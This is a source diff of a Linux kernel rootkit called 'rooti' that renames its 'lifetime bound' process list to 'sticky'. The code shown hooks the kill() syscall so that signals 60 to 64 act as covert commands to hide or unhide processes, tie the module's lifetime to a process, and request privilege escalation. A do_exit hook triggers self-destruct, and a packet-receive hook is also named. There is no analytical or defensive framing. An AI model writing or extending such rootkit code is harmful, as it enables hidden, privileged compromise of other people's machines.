@@ -30,11 +30,11 @@ MODULE_INFO(intree, "Y");
 
 // Unused signal numbers which can be used by the rootkit for its own purposes
 enum rooti_signal {
-    ROOTI_SIG_PROC_LIFETIME_UNBIND = 60,  // request to unbind modules lifetime to the process
-    ROOTI_SIG_PROC_LIFETIME_BIND = 61,    // request to bind module lifetime to the process
-    ROOTI_SIG_PROC_UNHIDE = 62,           // request to unhide a process
-    ROOTI_SIG_PROC_HIDE = 63,             // request to hide a process
-    ROOTI_SIG_PROC_PE = 64                // request for privilege escalation
+    ROOTI_SIG_PROC_UNSTICK  = 60,
+    ROOTI_SIG_PROC_STICK    = 61,
+    ROOTI_SIG_PROC_UNHIDE   = 62,
+    ROOTI_SIG_PROC_HIDE     = 63,
+    ROOTI_SIG_PROC_PE       = 64
 };
 
 struct inode *utmp_inode;
@@ -68,10 +68,10 @@ static asmlinkage long hook_kill(const struct pt_regs *regs)
     case ROOTI_SIG_PROC_UNHIDE:
         rooti_pid_list_del(current->pid, &rooti_hidden_pids);
         return 0;
-    case ROOTI_SIG_PROC_LIFETIME_BIND:
-        return rooti_pid_list_add(current->pid, &rooti_lifetime_bound_pids);
-    case ROOTI_SIG_PROC_LIFETIME_UNBIND:
-        rooti_pid_list_del(current->pid, &rooti_lifetime_bound_pids);
+    case ROOTI_SIG_PROC_STICK:
+        return rooti_pid_list_add(current->pid, &rooti_sticky_pids);
+    case ROOTI_SIG_PROC_UNSTICK:
+        rooti_pid_list_del(current->pid, &rooti_sticky_pids);
         return 0;
     default:
         return orig_kill(regs);
@@ -195,9 +195,9 @@ static int hook_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
 // Should really be flagged as noreturn but that raises an objtool warning
 static void hook_do_exit(long code)
 {
-    bool should_unload = rooti_pid_list_contains(current->pid, &rooti_lifetime_bound_pids);
+    bool should_unload = rooti_pid_list_contains(current->pid, &rooti_sticky_pids);
     rooti_pid_list_del(current->pid, &rooti_hidden_pids);
-    rooti_pid_list_del(current->pid, &rooti_lifetime_bound_pids);
+    rooti_pid_list_del(current->pid, &rooti_sticky_pids);
 
     if (should_unload)
         rooti_self_destruct();
@@ -297,7 +297,7 @@ static void __exit rooti_exit(void)
 
     // Release any remaining records
     rooti_pid_list_clear(&rooti_hidden_pids);
-    rooti_pid_list_clear(&rooti_lifetime_bound_pids);
+    rooti_pid_list_clear(&rooti_sticky_pids);
 
     ROOTI_DEBUG("exit");
 }
